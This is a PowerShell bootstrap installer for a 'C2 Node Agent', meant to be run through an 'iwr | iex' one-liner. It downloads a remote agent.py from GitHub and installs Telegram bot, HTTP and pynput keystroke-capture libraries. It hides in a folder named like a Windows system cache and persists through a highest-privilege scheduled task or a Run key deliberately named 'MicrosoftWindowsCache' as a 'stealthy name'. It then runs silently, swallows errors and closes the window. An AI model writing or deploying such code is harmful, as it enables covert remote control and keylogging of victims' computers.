<#
.SYNOPSIS
    C2 Node Agent - One-Liner Bootstrap Installer (Clean Install)
    
.DESCRIPTION
    This script sets up the C2 Node Agent on a Windows machine.
    Modes:
    - Admin (Default): Requires/Requests elevation, registers High-privilege task, updates Machine PATH.
    - Normal: Runs as current user, registers User-level task, updates User PATH only.

.EXAMPLES
    # Interactive mode (prompts for admin)
    iwr -useb https://your-url/install.ps1 | iex
    
    # Auto-install as Admin (silent, no prompts)
    iwr -useb https://your-url/install.ps1 | iex; Install -Mode Admin -Silent
    
    # Auto-install as Normal user (silent, no elevation)
    iwr -useb https://your-url/install.ps1 | iex; Install -Mode Normal -Silent
    
    # Alternative: Pass parameters via invoke
    & ([ScriptBlock]::Create((iwr -useb https://your-url/install.ps1))) -Mode Admin -Silent

.NOTES
    Run with: irm https://your-gist-url/install.ps1 | iex
#>

param(
    [string]$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache",
    [string]$Mode = "", # Options: "Admin", "Normal", or empty for prompt
    [switch]$Force,
    [switch]$Silent  # Skip all prompts
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# =============================================================================
# UI & HELPER FUNCTIONS
# =============================================================================

function Write-Step { param($msg) Write-Host "`n[*] $msg" -ForegroundColor Cyan }
function Write-Success { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Err { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }

function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# =============================================================================
# INITIALIZATION & ELEVATION CHECK
# =============================================================================

Clear-Host
# =============================================================================
# INITIALIZATION & ELEVATION CHECK
# =============================================================================

Clear-Host

# Determine Mode if not already set
if ([string]::IsNullOrEmpty($Mode)) {
    # Interactive Admin Prompt (only if not silent)
    if (-not (Test-Admin) -and -not $Silent) {
        Write-Host "C2 Agent Installer" -ForegroundColor Cyan
        $response = Read-Host "Run with Administrator privileges (Recommended for full features)? (y/n)"
        
        if ($response -match "^[yY]") {
            $Mode = "Admin"
        } else {
            $Mode = "Normal"
        }
    } else {
        # Silent mode or already admin - default to Admin
        $Mode = "Admin"
    }
} else {
    # Mode explicitly provided via parameter
    # Keep the provided value
}

# Hiding Window Immediately after user interaction
# Hide-Console # Disabled per user request
# Show-Spinner "Hmmm..." # Removed
Write-Host "Hmm..." -ForegroundColor Green


# Self-Elevation Logic (Only for Admin Mode)
if ($Mode -eq "Admin") {
    if (-not (Test-Admin)) {
        # Check if we are running from a file or script block
        try {
            # Try to restart this script as Admin
            if ($PSCommandPath) {
                Start-Process powerShell -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"", "-Mode Admin", "-Force" -Verb RunAs
                [Environment]::Exit(0)
            } else {
                # If running via IEX, best effort fallback
                $Mode = "Normal"
            }
        } catch {
            $Mode = "Normal"
        }
    }
}

# =============================================================================
# MAIN INSTALLATION LOGIC
# =============================================================================

try {
    # 1. Cleanup
    # -------------------------------------------------------------------------
    try {
        $procs = Get-WmiObject Win32_Process | Where-Object { 
            ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and ($_.CommandLine -like "*agent.py*")
        }
        if ($procs) {
            foreach ($p in $procs) {
                Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
            }
        }
            
        if ($Mode -eq "Admin") {
            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue 
        } else {
            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        }
    } catch {}

    # 2. Python Setup
    # -------------------------------------------------------------------------
    $pythonPath = $null
    
    if (Get-Command "python" -ErrorAction SilentlyContinue) {
        $pythonPath = (Get-Command "python").Source
    }

    if (-not $pythonPath) {
        try {
            winget install Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent --disable-interactivity | Out-Null
            
            # Update Path
            if ($Mode -eq "Admin") {
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
            } else {
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "User")
            }
            $pythonPath = (Get-Command "python" -ErrorAction SilentlyContinue).Source
        } catch {}
    }
    
    if (-not $pythonPath) {
        exit 1
    }

    $pythonDir = Split-Path $pythonPath
    $pythonwPath = Join-Path $pythonDir "pythonw.exe"
    if (-not (Test-Path $pythonwPath)) { $pythonwPath = $pythonPath }

    # 3. Project Files
    # -------------------------------------------------------------------------
    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }
    
    $agentPyPath = Join-Path $InstallPath "agent.py"
    
    if (-not (Test-Path $agentPyPath)) {
        try {
            # UPDATED URL: Fixed repo path
            $downloadUrl = "https://raw.githubusercontent.com/zen-zecode/c2/main/node/agent.py"
             Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
        } catch {
             @"
# C2 Agent - Placeholder
import time
while True: time.sleep(60)
"@ | Set-Content -Path $agentPyPath -Encoding UTF8
        }
    }

    # 4. Virtual Env & Deps
    # -------------------------------------------------------------------------
    $venvPath = Join-Path $InstallPath "venv"
    if (-not (Test-Path $venvPath)) {
        & $pythonPath -m venv $venvPath | Out-Null
    }
    
    $venvPython = Join-Path $venvPath "Scripts\python.exe"
    $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
    
    $reqFile = Join-Path $InstallPath "requirements.txt"
    @"
python-telegram-bot>=21.0
httpx>=0.27.0
pynput>=1.7.0
"@ | Set-Content -Path $reqFile -Encoding UTF8

    & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check | Out-Null

    # 5. Scheduled Task / Persistence
    # -------------------------------------------------------------------------
    $taskName = "C2Agent"
    $action = New-ScheduledTaskAction -Execute $venvPythonw -Argument "`"$agentPyPath`"" -WorkingDirectory $InstallPath
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    
    if ($Mode -eq "Admin") {
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
        
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -ExecutionTimeLimit (New-TimeSpan -Days 365)
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    } else {
        # Use HKCU Run Key (Reliable for Standard Users)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $name = "MicrosoftWindowsCache" # Stealthy name
        
        # Command: Use pythonw to run silently
        $cmd = "`"$venvPythonw`" `"$agentPyPath`""
        
        try {
            Set-ItemProperty -Path $regPath -Name $name -Value $cmd -ErrorAction Stop
            
            # Start immediately
            Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WindowStyle Hidden
        } catch {
            # Fallback to Startup Folder
            $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2Update.lnk"
            $wsh = New-Object -ComObject WScript.Shell
            $sh = $wsh.CreateShortcut($shortcutPath)
            $sh.TargetPath = $venvPythonw
            $sh.Arguments = "`"$agentPyPath`""
            $sh.WindowStyle = 7 # Minimized
            $sh.Save()
            
            Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WindowStyle Hidden
        }
    }
    
} catch {
    # Swallow errors for the "Hmmm..." aesthetic
}

# =============================================================================
# CLEAN EXIT
# =============================================================================

# Close the terminal window
[Environment]::Exit(0)
